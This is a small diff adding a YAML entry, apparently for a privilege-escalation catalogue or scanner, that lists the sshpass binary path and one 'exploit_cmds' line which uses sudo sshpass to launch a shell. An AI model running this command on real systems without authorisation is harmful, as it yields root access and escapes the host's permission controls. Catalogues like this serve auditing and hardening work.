@@ -1,0 +1,4 @@
+name: sshpass
+binary_path: /usr/bin/sshpass
+exploit_cmds:
+- sudo /usr/bin/sshpass /bin/sh
